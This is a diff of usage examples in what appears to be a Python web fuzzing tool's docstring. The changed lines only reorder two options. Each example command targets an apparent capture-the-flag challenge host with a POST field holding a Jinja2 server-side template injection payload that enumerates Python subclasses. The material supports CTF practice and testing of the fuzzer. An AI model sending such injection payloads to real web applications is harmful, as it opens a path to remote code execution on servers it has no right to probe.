@@ -647,14 +647,14 @@ if __name__ == "__main__":
 
 单元测试脚本
 
-python main.py -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -w ['waf'] -c {} -d 0 -cc 100 -t 60 -a 10
+python main.py -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -c {} -w ['waf'] -d 0 -cc 100 -t 60 -a 10
 
-main -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -w ['waf'] -c {} -d 0 -cc 100 -t 60 -a 10
+main -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -c {} -w ['waf'] -d 0 -cc 100 -t 60 -a 10
 
-webfuzz -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -w ['waf'] -c {} -d 0 -cc 100 -t 60 -a 10
+webfuzz -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -c {} -w ['waf'] -d 0 -cc 100 -t 60 -a 10
 
-WebFuzz -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -w ['waf'] -c {} -d 0 -cc 100 -t 60 -a 10
+WebFuzz -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -c {} -w ['waf'] -d 0 -cc 100 -t 60 -a 10
 
-WebFuzz -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -w ['waf'] -c {} -d 0 -cc 100 -t 60 -a 10
+WebFuzz -u http://challenge.imxbt.cn:31952/ -f POST -g {} -p {'user_input':'{{().__class__.__bases__[0].__subclasses__()}}'} -c {} -w ['waf'] -d 0 -cc 100 -t 60 -a 10
 
 """
